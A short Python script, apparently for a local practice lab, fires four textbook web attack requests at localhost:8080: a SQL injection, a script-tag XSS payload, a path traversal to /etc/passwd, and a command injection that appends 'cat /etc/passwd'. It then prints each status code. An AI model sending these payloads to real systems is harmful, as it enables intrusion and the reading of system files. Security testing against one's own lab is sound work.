import requests
import time

BASE_URL = "http://localhost:8080"

attacks = [
    {"name": "SQL Injection", "path": "/rest/products/search?q=apple' OR 1=1--"},
    {"name": "XSS", "path": "/search?q=<script>alert('XSS')</script>"},
    {"name": "Path Traversal", "path": "/ftp/../../etc/passwd"},
    {"name": "Command Injection", "path": "/api?id=1;cat /etc/passwd"}
]

for attack in attacks:
    try:
        print(f"🚀 Launching {attack['name']}...")
        response = requests.get(BASE_URL + attack['path'], timeout=5)
        print(f"   Status: {response.status_code}")
    except Exception as e:
        print(f"   Error: {e}")
    time.sleep(1)
